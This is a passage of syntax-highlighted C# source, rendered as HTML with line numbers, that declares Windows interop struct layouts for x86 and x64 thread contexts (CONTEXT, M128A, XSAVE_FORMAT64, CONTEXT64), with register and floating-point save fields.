class="hljs-keyword">uint</span>&nbsp;ErrorOffset;<br><span class="linenum hljs-number"> 96</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;ErrorSelector;<br><span class="linenum hljs-number"> 97</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;DataOffset;<br><span class="linenum hljs-number"> 98</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;DataSelector;<br><span class="linenum hljs-number"> 99</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;80)</span>]<br><span class="linenum hljs-number">100</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;RegisterArea;<br><span class="linenum hljs-number">101</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Cr0NpxState;<br><span class="linenum hljs-number">102</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">103</span><br><span class="linenum hljs-number">104</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential)</span>]<br><span class="linenum hljs-number">105</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;CONTEXT<br><span class="linenum hljs-number">106</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">107</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;ContextFlags;&nbsp;<span class="hljs-comment">//set&nbsp;this&nbsp;to&nbsp;an&nbsp;appropriate&nbsp;value</span><br><span class="linenum hljs-number">108</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_DEBUG_REGISTERS</span><br><span class="linenum hljs-number">109</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr0;<br><span class="linenum hljs-number">110</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr1;<br><span class="linenum hljs-number">111</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr2;<br><span class="linenum hljs-number">112</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr3;<br><span class="linenum hljs-number">113</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr6;<br><span class="linenum hljs-number">114</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Dr7;<br><span class="linenum hljs-number">115</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_FLOATING_POINT</span><br><span class="linenum hljs-number">116</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;FLOATING_SAVE_AREA&nbsp;FloatSave;<br><span class="linenum hljs-number">117</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_SEGMENTS</span><br><span class="linenum hljs-number">118</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegGs;<br><span class="linenum hljs-number">119</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegFs;<br><span class="linenum hljs-number">120</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegEs;<br><span class="linenum hljs-number">121</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegDs;<br><span class="linenum hljs-number">122</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_INTEGER</span><br><span class="linenum hljs-number">123</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Edi;<br><span class="linenum hljs-number">124</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Esi;<br><span class="linenum hljs-number">125</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Ebx;<br><span class="linenum hljs-number">126</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Edx;<br><span class="linenum hljs-number">127</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Ecx;<br><span class="linenum hljs-number">128</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Eax;<br><span class="linenum hljs-number">129</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_CONTROL</span><br><span class="linenum hljs-number">130</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Ebp;<br><span class="linenum hljs-number">131</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Eip;<br><span class="linenum hljs-number">132</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegCs;<br><span class="linenum hljs-number">133</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;EFlags;<br><span class="linenum hljs-number">134</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Esp;<br><span class="linenum hljs-number">135</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;SegSs;<br><span class="linenum hljs-number">136</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Retrieved&nbsp;by&nbsp;CONTEXT_EXTENDED_REGISTERS</span><br><span class="linenum hljs-number">137</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;512)</span>]<br><span class="linenum hljs-number">138</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;ExtendedRegisters;<br><span class="linenum hljs-number">139</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">140</span><br><span class="linenum hljs-number">141</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Next&nbsp;x64</span><br><span class="linenum hljs-number">142</span><br><span class="linenum hljs-number">143</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential)</span>]<br><span class="linenum hljs-number">144</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;M128A<br><span class="linenum hljs-number">145</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">146</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;High;<br><span class="linenum hljs-number">147</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">long</span>&nbsp;Low;<br><span class="linenum hljs-number">148</span><br><span class="linenum hljs-number">149</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">override</span>&nbsp;<span class="hljs-keyword">string</span>&nbsp;<span class="hljs-title">ToString</span>(<span class="hljs-params"></span>)<br><span class="linenum hljs-number">150</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">151</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-keyword">string</span>.Format(<span class="hljs-string">"High:{0},&nbsp;Low:{1}"</span>,&nbsp;<span class="hljs-keyword">this</span>.High,&nbsp;<span class="hljs-keyword">this</span>.Low);<br><span class="linenum hljs-number">152</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">153</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">154</span><br><span class="linenum hljs-number">155</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;<span class="hljs-doctag">&lt;summary&gt;</span></span><br><span class="linenum hljs-number">156</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;x64</span><br><span class="linenum hljs-number">157</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;<span class="hljs-doctag">&lt;/summary&gt;</span></span><br><span class="linenum hljs-number">158</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential,&nbsp;Pack&nbsp;=&nbsp;16)</span>]<br><span class="linenum hljs-number">159</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;XSAVE_FORMAT64<br><span class="linenum hljs-number">160</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">161</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;ControlWord;<br><span class="linenum hljs-number">162</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;StatusWord;<br><span class="linenum hljs-number">163</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">byte</span>&nbsp;TagWord;<br><span class="linenum hljs-number">164</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">byte</span>&nbsp;Reserved1;<br><span class="linenum hljs-number">165</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;ErrorOpcode;<br><span class="linenum hljs-number">166</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;ErrorOffset;<br><span class="linenum hljs-number">167</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;ErrorSelector;<br><span class="linenum hljs-number">168</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;Reserved2;<br><span class="linenum hljs-number">169</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;DataOffset;<br><span class="linenum hljs-number">170</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;DataSelector;<br><span class="linenum hljs-number">171</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;Reserved3;<br><span class="linenum hljs-number">172</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;MxCsr;<br><span class="linenum hljs-number">173</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;MxCsr_Mask;<br><span class="linenum hljs-number">174</span><br><span class="linenum hljs-number">175</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;8)</span>]<br><span class="linenum hljs-number">176</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;M128A[]&nbsp;FloatRegisters;<br><span class="linenum hljs-number">177</span><br><span class="linenum hljs-number">178</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;16)</span>]<br><span class="linenum hljs-number">179</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;M128A[]&nbsp;XmmRegisters;<br><span class="linenum hljs-number">180</span><br><span class="linenum hljs-number">181</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;96)</span>]<br><span class="linenum hljs-number">182</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;Reserved4;<br><span class="linenum hljs-number">183</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">184</span><br><span class="linenum hljs-number">185</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;<span class="hljs-doctag">&lt;summary&gt;</span></span><br><span class="linenum hljs-number">186</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;x64</span><br><span class="linenum hljs-number">187</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"><span class="hljs-doctag">///</span>&nbsp;<span class="hljs-doctag">&lt;/summary&gt;</span></span><br><span class="linenum hljs-number">188</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential,&nbsp;Pack&nbsp;=&nbsp;16)</span>]<br><span class="linenum hljs-number">189</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;CONTEXT64<br><span class="linenum hljs-number">190</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">191</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P1Home;<br><span class="linenum hljs-number">192</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P2Home;<br><span class="linenum hljs-number">193</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P3Home;<br><span class="linenum hljs-number">194</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P4Home;<br><span class="linenum hljs-number">195</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P5Home;<br><span class="linenum hljs-number">196</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;P6Home;<br><span class="linenum hljs-number">197</span><br><span class="linenum hljs-number">198</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;CONTEXT_FLAGS&nbsp;ContextFlags;<br><span class="linenum hljs-number">199</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;MxCsr;<br><span class="linenum hljs-number">200</span><br><span class="linenum hljs-number">201</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegCs;<br><span class="linenum hljs-number">202</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegDs;<br><span class="linenum hljs-number">203</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegEs;<br><span class="linenum hljs-number">204</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegFs;<br><span class="linenum hljs-number">205</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegGs;<br><span class="linenum hljs-number">206</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ushort</span>&nbsp;SegSs;<br><span class="linenum hljs-number">207</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;EFlags;<br><span class="linenum hljs-number">208</span><br><span class="linenum hljs-number">209</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr0;<br><span class="linenum hljs-number">210</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr1;<br><span class="linenum hljs-number">211</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr2;<br><span class="linenum hljs-number">212</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr3;<br><span class="linenum hljs-number">213</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr6;<br><span class="linenum hljs-number">214</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Dr7;<br><span class="linenum hljs-number">215</span><br><span class="linenum hljs-number">216</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rax;<br><span class="linenum 